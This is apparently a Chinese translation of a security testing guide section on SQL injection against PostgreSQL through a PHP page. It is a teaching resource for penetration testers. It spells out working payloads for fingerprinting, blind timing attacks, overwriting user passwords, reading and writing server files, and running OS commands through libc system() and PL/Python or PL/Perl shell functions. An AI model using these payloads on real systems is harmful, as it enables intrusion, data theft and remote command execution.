# 测试PostgreSQL

## 概述

在本节中，将讨论一些适用于PostgreSQL的SQL注入技术。这些技术具有以下特点：

- PHP连接器允许使用`;`作为语句分隔符执行多个语句
- 可以通过附加注释字符来截断SQL语句：`--`。
- `LIMIT`和`OFFSET`可用于`SELECT`语句中，以检索由`query`生成的结果集的一部分

从现在开始，假设`https://www.example.com/news.php?id=1`容易受到SQL注入攻击。

## 如何测试

### 识别PostgreSQL

当发现SQL注入时，您需要仔细对后端数据库引擎进行指纹识别。您可以使用*::*强制类型转换运算符确定后端数据库引擎是PostgreSQL。

#### 示例

`https://www.example.com/store.php?id=1 AND 1::int=1`

此外，函数*version()*可用于获取PostgreSQL横幅。这也将显示底层操作系统类型和版本。

##### 示例

`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`

可能返回的横幅字符串示例：

`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`

### 盲注入

对于盲SQL注入攻击，您应考虑以下内置函数：

- 字符串长度
`LENGTH(str)`

- 从给定字符串中提取子字符串
`SUBSTR(str,index,offset)`

- 没有单引号的字符串表示
`CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`

从版本8.2开始，PostgreSQL引入了一个内置函数`pg_sleep(n)`，使当前会话进程睡眠`n`秒。此函数可用于执行时序攻击（详见[盲SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection))。

此外，您可以通过使用libc在早期版本中轻松创建自定义`pg_sleep(n)`：

- `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`

### 单引号反转义

可以使用`chr()`函数对字符串进行编码，以防止单引号转义。

- `chr(n)`：返回与数字`n`对应的ASCII值
- `ascii(n)`：返回与字符`n`对应的ASCII值

假设您要编码字符串'root'：

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

我们可以将'root'编码为：

`chr(114)||chr(111)||chr(111)||chr(116)`

#### 示例

`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`

### 攻击向量

#### 当前用户

可以使用以下SQL SELECT语句检索当前用户的身份：

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

##### 示例

```text
https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### 当前数据库

内置函数current\_database()返回当前数据库名称。

##### 示例

`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`

#### 从文件读取

PostgreSQL提供两种访问本地文件的方式：

- `COPY`语句
- `pg_read_file()`内部函数（从PostgreSQL 8.1开始）

##### COPY

此运算符在文件和表之间复制数据。PostgreSQL引擎以`postgres`用户身份访问本地文件系统。

###### 示例

```text
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

数据应该通过执行`UNION Query SQL注入`来检索：

- 使用`COPY`语句检索之前添加到`file_store`的行数
- 使用UNION SQL注入一次检索一行

```text
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### pg_read_file()

此函数在`PostgreSQL 8.1`中引入，允许读取位于DBMS数据目录内的任意文件。

###### 示例

`SELECT pg_read_file('server.key',0,1000);`

#### 写入文件

通过反转COPY语句，我们可以用`postgres`用户权限写入本地文件系统

`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`

#### Shell注入

PostgreSQL提供了使用动态库和脚本语言（如Python、Perl和TCL）添加自定义函数的机制。

##### 动态库

在PostgreSQL 8.1之前，可以添加链接到`libc`的自定义函数：

`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`

由于`system`返回`int`，我们如何从`system` stdout获取结果？

这里有个小技巧：

- 创建一个`stdout`表：`CREATE TABLE stdout(id serial, system_out text)`
- 执行重定向其`stdout`的shell命令：`SELECT system('uname -a > /tmp/test')`
- 使用`COPY`语句将先前命令的输出推送到`stdout`表：`COPY stdout(system_out) FROM '/tmp/test*'`
- 从`stdout`检索输出：`SELECT system_out FROM stdout`

###### 示例

```text
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### Plpython

PL/Python允许用户用python编写PostgreSQL函数。它是不可信的，因此没有办法限制用户可以做什么。默认情况下不安装，可以通过`CREATELANG`在给定数据库上启用。

- 检查PL/Python是否已在数据库上启用：`SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
- 如果没有，尝试启用：`CREATE LANGUAGE plpythonu`
- 如果以上任一成功，创建一个代理shell函数：`CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`
- 使用：`SELECT proxyshell(os command);`

###### 示例

- 创建一个代理shell函数：`/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os;return os.popen(args[0]).read()' LANGUAGE plpythonu;--`
- 运行OS命令：`/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

##### Plperl

Plperl允许我们用perl编写PostgreSQL函数。通常，它作为可信语言安装，以禁用与底层操作系统交互的运行时执行（例如`open`）。这样，就不可能获得操作系统级访问。要成功注入类似proxy shell的函数，我们需要从`postgres`用户安装不可信版本，以避免所谓的可信/不可信操作的应用程序屏蔽过滤。

- 检查PL/perl-untrusted是否已启用：`SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
- 如果没有，假设sysadm已经安装了plperl包，尝试：`CREATE LANGUAGE plperlu`
- 如果以上任一成功，创建一个代理shell函数：`CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu`
- 使用：`SELECT proxyshell(os command);`

###### 示例

- 创建一个代理shell函数：`/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;`
- 运行OS命令：`/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`
